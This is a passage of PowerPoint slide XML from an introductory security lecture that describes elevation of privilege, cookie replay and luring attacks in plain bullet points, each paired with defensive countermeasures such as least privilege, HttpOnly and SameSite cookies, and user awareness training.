              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="197432116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799AD-9BB3-98CD-1FCB-028C45DADE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743FF9-F321-33F3-06E9-1CDCDE978D16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C91FF6E-9DB4-C3BA-6630-B9CE2CA44FEE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Educate users about phishing tactics.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>email filtering &amp; anti-phishing tools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>MFA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to protect even if credentials are stolen.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Verify domains and SSL certificates before logging in.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Deploy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>DMARC, SPF, DKIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> for email authenticity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Encourage reporting of suspicious emails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>·  Conduct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>regular phishing awareness drills</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="184060194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83198-3D55-BDF8-016B-7B1544EAE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4B0E8A-3E37-30B4-E11A-7E4C57BD01C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Elevation of Privilege</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8445E119-D4AA-E018-208F-A41D74C5A620}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Attacker gains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>higher-level access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> than intended.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Exploits flaws in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>access control or vulnerabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Example: user-level account escalates to admin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Can be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>vertical escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> (low privilege → high privilege).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>horizontal escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> (same privilege → another user’s data).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  May involve OS vulnerabilities or insecure app design.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Allows attacker to control critical systems/data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Often used as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>post-exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> after initial compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="341198267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108E5-1E96-75F5-6075-CA0A642533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5E778A-DAF9-1A97-E1B1-C4D05471E602}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FB7F184-9959-29BF-B80B-0EDE7FA829B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>principle of least privilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Regularly review </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>access rights</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Patch known privilege escalation vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>role-based access control (RBAC)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Employ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>logging &amp; monitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> for abnormal privilege changes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>segregation of duties</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Conduct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>penetration testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> for privilege escalation flaws.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="68308051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899C8-7A33-16C5-D14D-6C2A2013C4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D8FE75-C22A-8E77-F466-F76B7EBFD3BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Cookie Replay</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90D676B7-541B-3AAB-8E94-EFBB451EFE21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Attacker steals valid </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>session cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Reuses them to impersonate a legitimate user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Methods: sniffing unencrypted traffic, XSS, malware.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Exploits </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>lack of session expiration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Effective against apps that rely only on cookies for session state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Often undetectable because requests look legitimate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Can grant full access until session expires.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Used in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>session hijacking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="279057867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F08AB-90A2-1BCC-8EEE-B465FEF509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7C55DB-D0A9-FC26-033C-513A91EE46A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8AB58A72-1D97-5CCD-511E-5F983D1B7F42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Always use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>HTTPS/TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to protect cookies in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Mark cookies as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Secure &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> attribute to prevent cross-site use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>short session timeouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Require </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reauthentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> for sensitive operations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Bind cookies to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>IP/device fingerprints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Monitor for suspicious session reuse.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="362196657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8E86F-02FD-1007-4DC1-A8346315DD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389C52-B128-EF1F-0F34-F5C9BA496AA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Luring Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4544E9C3-5F71-67C1-521A-C60F2D13DA8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Attacker tricks user into visiting malicious sites or executing actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Often disguised as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>free downloads, fake ads, or offers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Relies heavily on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>social engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>May deliver malware or request login credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Example: watering-hole attacks (infected popular sites).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Can be combined with phishing emails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Targets </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>curiosity and trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> of users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Very effective against inexperienced users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="90286538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B2F2C-F0D8-5DCC-A05E-AB238324F4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725955-1DDF-16D1-5655-9A956A40EA2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5FA6B08-F840-CE1F-3138-61E65E96039E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>User awareness &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>security training</a:t>
